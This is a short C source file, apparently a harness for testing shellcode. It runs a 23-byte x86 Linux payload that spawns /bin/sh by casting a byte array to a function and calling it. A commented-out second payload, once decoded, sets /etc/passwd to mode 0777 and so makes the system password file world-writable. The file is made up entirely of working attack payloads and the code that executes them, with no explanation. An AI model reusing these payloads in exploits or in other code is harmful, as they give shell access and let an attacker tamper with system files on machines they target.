// #include <stdio.h>

// void main() {
//    // char *name[2];

//    // name[0] = "/bin/sh";
//    // name[1] = NULL;
//    // execve(name[0], name, NULL);
//    unsigned char shellcode[] = "\x6a\x0f\x58\x68\x90\x90\xff\x01\x59\xc1\xe9\x10\x68\x90\x73\x77\x64\x5b\xc1\xeb\x08\x53\x68\x2f\x70\x61\x73\x68\x2f\x65\x74\x63\x89\xe3\xcd\x80\xb0\x01\xb3\x01\xcd\x80";
//    fprintf(stdout, "Length: %d\n\n", strlen(shellcode));
//    (*(void(*)()) shellcode)();
// }
#include <stdio.h>
#include <string.h>
 
unsigned char code[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

// int hello(){
//    printf("Hello");
//    return 0;
// }
int main(void)
{
printf("Length: %ld\n",strlen(code));
int (*ret)()= (int(*)()) code;
// int (*ret)()= *hello;
ret();

return 0;
}
